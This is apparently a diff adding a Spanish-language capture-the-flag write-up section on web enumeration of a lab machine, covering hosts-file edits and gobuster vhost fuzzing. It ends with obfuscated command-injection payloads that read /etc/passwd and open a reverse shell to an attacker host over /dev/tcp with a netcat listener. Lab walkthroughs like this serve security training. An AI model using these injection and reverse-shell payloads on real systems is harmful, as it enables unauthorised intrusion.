@@ -75,3 +75,83 @@ Este análisis permite detectar información relevante como el tipo de servidor 
 ![Despliegue](Imagenes/nmap.png)
 
 ---
+
+---
+
+# 🌐 **4. Enumeración Web**
+
+Accedemos al servicio HTTP:
+
+```bash
+http://172.17.0.2
+```
+
+No muetsra un dominio:
+
+internal.dl
+
+Se tiene que agregar a: /etc/hosts
+
+```bash
+nano /etc/hosts
+```
+```bash
+172.17.0.2 internal.dl
+```
+![Despliegue](Imagenes/subdominio.png) 
+
+Y nos muestra una pagina: 
+
+![Despliegue](Imagenes/pagina.png) 
+
+No encontramos hicimos fuzzing de directorios sin exito asi que buscamos subdominios:
+
+```bash
+gobuster vhost --append-domain -u http://internal.dl/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k --exclude-length 154
+```
+![Despliegue](Imagenes/subdominio.png)  
+
+Y encontramos 
+
+```bash
+backup.internal.dl
+```
+
+Se tiene que agregar tambien a: /etc/hosts
+
+```bash
+nano /etc/hosts
+```
+```bash
+172.17.0.2 internal.dl backup.internal.dl
+```
+![Despliegue](Imagenes/hostdos.png) 
+
+Podemos acceder y encontramos una parte donde podemos mandar comandos:
+
+![Despliegue](Imagenes/backupsubdo.png) 
+
+Al hacer pruebas podemos ver usuarios con el comando:
+
+```bash
+/etc/passwd$(c''a''t /etc/passwd)
+```
+
+![Despliegue](Imagenes/usuario.png) 
+
+usuario encotrado
+
+```bash
+vault
+```
+Ahora en la maquina atacante nos ponemos en modo escuha:
+
+```bash
+sudo nc -lvn 445
+```
+
+y ejecuatmos el payload para acceder a una terminal
+
+```bash
+/home $(bash ''h -c "bash''h -i <& /dev/tcp/192.168.0.100/445 0>&1")
+```
